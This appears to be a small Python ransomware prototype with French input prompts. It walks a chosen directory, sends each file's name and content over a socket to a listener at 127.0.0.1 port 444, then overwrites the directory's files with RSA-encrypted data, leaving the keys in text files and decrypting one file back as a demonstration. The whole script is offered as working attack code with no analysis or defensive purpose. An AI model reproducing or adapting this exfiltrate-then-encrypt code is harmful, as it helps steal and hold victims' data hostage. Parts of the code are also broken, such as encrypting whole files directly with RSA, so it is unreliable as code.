import socket 
import os 
import rsa
import shutil
import sys

pub_key,priv_key=rsa.newkeys(2048)

with open('prive_key.txt',"w") as f:
          f.write(priv_key.save_pkcs1().decode())

with open('public_key.txt',"w") as f:
    f.write(pub_key.save_pkcs1().decode())

directory=input("quel dir à chiffrer\n")
copied = input("directory copié\n")

if os.path.exists(copied):
    shutil.rmtree(copied)

shutil.copytree(directory,copied)

client = socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)

host='127.0.0.1'
port=444    


client.connect((host,port))

for foldername, subfolders, filenames in os.walk(directory):
    for filename in filenames:
        file_path = os.path.join(foldername, filename)
        try:
            print("Reading " + filename + "...")
            with open(file_path, 'rb') as f:
                file_content = f.read()
            print("Sending " + filename + "'s content")
            client.send(filename.encode('utf-8'))
            print("Waiting for response")
            ack = client.recv(1024)
            print("Response recieved")
            client.send(file_content)
        except Exception as e:
            print(f"Error sending file {file_path} to the server: {e}")
print("Sending done signal")
client.send("done".encode())

for file in os.listdir(directory):
    with open(directory + "/" + file, "rb") as f:
        content=f.read()
    with open(directory + "/" + file, 'wb') as f:
        f.write(rsa.encrypt(content,pub_key))

file = os.listdir(directory)[0]
with open(directory + "/" + file, "rb") as f:
    content=f.read()
with open(directory + "/" + file, "wb") as f:
    f.write(rsa.decrypt(content,priv_key))